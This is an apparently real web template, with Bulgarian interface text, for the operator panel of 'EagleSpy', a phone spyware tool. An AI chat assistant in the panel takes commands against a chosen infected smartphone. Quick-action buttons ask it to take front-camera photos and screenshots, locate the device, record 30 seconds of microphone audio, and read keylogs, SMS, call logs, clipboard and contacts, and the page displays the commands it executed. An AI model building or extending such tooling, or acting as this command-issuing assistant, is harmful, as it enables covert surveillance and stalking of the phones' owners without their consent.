<div class="ai-chat-page" style="padding: 0; height: calc(100vh - 120px); display: flex; flex-direction: column;">
  <style>
    .chat-container { display: flex; flex-direction: column; height: 100%; background: #0d1117; border-radius: 12px; overflow: hidden; border: 1px solid #30363d; }
    .chat-header { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 15px 20px; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid #30363d; }
    .chat-header h2 { margin: 0; color: #00d4ff; font-size: 18px; }
    .chat-header select { padding: 8px 12px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; font-size: 14px; }
    .chat-messages { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; }
    .chat-msg { max-width: 80%; padding: 12px 16px; border-radius: 16px; font-size: 14px; line-height: 1.5; word-wrap: break-word; white-space: pre-wrap; }
    .chat-msg.user { align-self: flex-end; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border-bottom-right-radius: 4px; }
    .chat-msg.assistant { align-self: flex-start; background: #1a1a2e; color: #c9d1d9; border: 1px solid #30363d; border-bottom-left-radius: 4px; }
    .chat-msg.system { align-self: center; background: #1c2333; color: #8b949e; font-size: 12px; padding: 8px 16px; border-radius: 20px; }
    .chat-msg .cmd-badge { display: inline-block; background: #238636; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; margin: 2px; }
    .chat-msg .cmd-badge.failed { background: #da3633; }
    .chat-msg .cmd-badge.timeout { background: #d29922; }
    .chat-input-area { padding: 15px 20px; background: #161b22; border-top: 1px solid #30363d; display: flex; gap: 10px; }
    .chat-input { flex: 1; padding: 12px 16px; border-radius: 24px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; font-size: 14px; outline: none; resize: none; font-family: inherit; }
    .chat-input:focus { border-color: #58a6ff; }
    .chat-input::placeholder { color: #484f58; }
    .chat-send { padding: 12px 24px; border-radius: 24px; border: none; background: linear-gradient(135deg, #667eea, #764ba2); color: white; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; min-width: 80px; }
    .chat-send:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(102,126,234,0.4); }
    .chat-send:disabled { opacity: 0.5; cursor: wait; transform: none; }
    .chat-typing { align-self: flex-start; color: #8b949e; font-size: 13px; padding: 8px 16px; display: none; }
    .chat-typing.active { display: block; }
    .chat-typing .dots { display: inline-block; }
    .chat-typing .dots span { animation: blink 1.4s infinite; opacity: 0.2; font-size: 20px; }
    .chat-typing .dots span:nth-child(2) { animation-delay: 0.2s; }
    .chat-typing .dots span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes blink { 20% { opacity: 1; } }
    .quick-actions { display: flex; gap: 8px; padding: 10px 20px; background: #161b22; border-top: 1px solid #21262d; overflow-x: auto; }
    .quick-btn { padding: 6px 14px; border-radius: 16px; border: 1px solid #30363d; background: #0d1117; color: #8b949e; font-size: 12px; cursor: pointer; white-space: nowrap; transition: all 0.2s; }
    .quick-btn:hover { background: #1a1a2e; color: #58a6ff; border-color: #58a6ff; }
  </style>

  <div class="chat-container">
    <!-- Header -->
    <div class="chat-header">
      <h2>🤖 EagleSpy AI Assistant</h2>
      <select id="chat-device">
        <option value="">Select device...</option>
        <% Smartphone.all.each do |s| %>
          <option value="<%= s.id %>"><%= s.name || "Device ##{s.id}" %></option>
        <% end %>
      </select>
      <button onclick="clearChat()" style="padding:6px 14px;border-radius:6px;border:1px solid #30363d;background:#0d1117;color:#8b949e;cursor:pointer;font-size:12px;">🗑️ Clear</button>
    </div>

    <!-- Messages -->
    <div class="chat-messages" id="chat-messages">
      <div class="chat-msg system">
        🤖 Здравей! Аз съм EagleSpy AI Assistant. Избери устройство и ми кажи какво да направя.<br>
        Примери: "Направи снимка с предна камера", "Къде се намира?", "Какво пише в момента?", "Покажи SMS-ите"
      </div>
    </div>

    <!-- Typing indicator -->
    <div class="chat-typing" id="chat-typing">
      🤖 AI мисли <span class="dots"><span>.</span><span>.</span><span>.</span></span>
    </div>

    <!-- Quick actions -->
    <div class="quick-actions">
      <button class="quick-btn" onclick="quickSend('Направи снимка с предна камера')">📷 Снимка</button>
      <button class="quick-btn" onclick="quickSend('Къде се намира устройството?')">📍 Локация</button>
      <button class="quick-btn" onclick="quickSend('Какво пише потребителят?')">⌨️ Keylogs</button>
      <button class="quick-btn" onclick="quickSend('Покажи последните SMS')">💬 SMS</button>
      <button class="quick-btn" onclick="quickSend('Покажи списък обаждания')">📞 Обаждания</button>
      <button class="quick-btn" onclick="quickSend('Направи screenshot')">🖥️ Screenshot</button>
      <button class="quick-btn" onclick="quickSend('Какво копира в clipboard?')">📋 Clipboard</button>
      <button class="quick-btn" onclick="quickSend('Покажи информация за устройството')">ℹ️ Device Info</button>
      <button class="quick-btn" onclick="quickSend('Запиши 30 секунди от микрофона')">🎤 Запис</button>
      <button class="quick-btn" onclick="quickSend('Кои приложения ползва най-много?')">📊 App Usage</button>
      <button class="quick-btn" onclick="quickSend('Покажи WiFi информация')">📶 WiFi</button>
      <button class="quick-btn" onclick="quickSend('Покажи контактите')">👥 Контакти</button>
    </div>

    <!-- Input -->
    <div class="chat-input-area">
      <textarea id="chat-input" class="chat-input" placeholder="Напиши какво искаш да направя..." rows="1"
        onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendMessage();}"></textarea>
      <button class="chat-send" id="chat-send" onclick="sendMessage()">Изпрати</button>
    </div>
  </div>
</div>

<script>
var chatHistory = [];

function getDeviceId() {
  var d = document.getElementById('chat-device').value;
  if (!d) { alert('⚠️ Моля, изберете устройство!'); return null; }
  return d;
}

function addMessage(role, content) {
  var container = document.getElementById('chat-messages');
  var div = document.createElement('div');
  div.className = 'chat-msg ' + role;
  
  // Format command badges
  if (role === 'assistant' && content) {
    content = content.replace(/\[EXECUTE:[^\]]+\]/g, '');
    content = content.replace(/\[DATA:[^\]]+\]/g, '');
  }
  
  div.textContent = content;
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

function addCommandBadges(commands) {
  if (!commands || commands.length === 0) return;
  var container = document.getElementById('chat-messages');
  var div = document.createElement('div');
  div.className = 'chat-msg system';
  var html = '⚡ Commands: ';
  commands.forEach(function(cmd) {
    var cls = cmd.result && cmd.result.status === 'success' ? 'cmd-badge' :
              cmd.result && cmd.result.status === 'timeout' ? 'cmd-badge timeout' : 'cmd-badge failed';
    html += '<span class="' + cls + '">' + cmd.command + ' → ' + (cmd.result ? cmd.result.status : 'sent') + '</span> ';
  });
  div.innerHTML = html;
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

function showTyping(show) {
  document.getElementById('chat-typing').className = show ? 'chat-typing active' : 'chat-typing';
  document.getElementById('chat-send').disabled = show;
}

function sendMessage() {
  var input = document.getElementById('chat-input');
  var message = input.value.trim();
  if (!message) return;
  var deviceId = getDeviceId();
  if (!deviceId) return;

  addMessage('user', message);
  chatHistory.push({ role: 'user', content: message });
  input.value = '';
  showTyping(true);

  var token = document.querySelector('meta[name="csrf-token"]').content;
  fetch('/admin/ai_chat/send_message', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
    body: JSON.stringify({
      device_id: deviceId,
      message: message,
      history: chatHistory.slice(-20)
    })
  })
  .then(function(r) { return r.json(); })
  .then(function(data) {
    showTyping(false);
    var content = data.content || data.error || 'No response';
    addMessage('assistant', content);
    chatHistory.push({ role: 'assistant', content: content });
    
    if (data.commands_executed && data.commands_executed.length > 0) {
      addCommandBadges(data.commands_executed);
    }
  })
  .catch(function(e) {
    showTyping(false);
    addMessage('assistant', '❌ Error: ' + e.message);
  });
}

function quickSend(text) {
  document.getElementById('chat-input').value = text;
  sendMessage();
}

function clearChat() {
  chatHistory = [];
  var container = document.getElementById('chat-messages');
  container.innerHTML = '<div class="chat-msg system">🤖 Чат изчистен. Готов съм за нови команди!</div>';
}

// Auto-resize textarea
document.getElementById('chat-input').addEventListener('input', function() {
  this.style.height = 'auto';
  this.style.height = Math.min(this.scrollHeight, 120) + 'px';
});
</script>
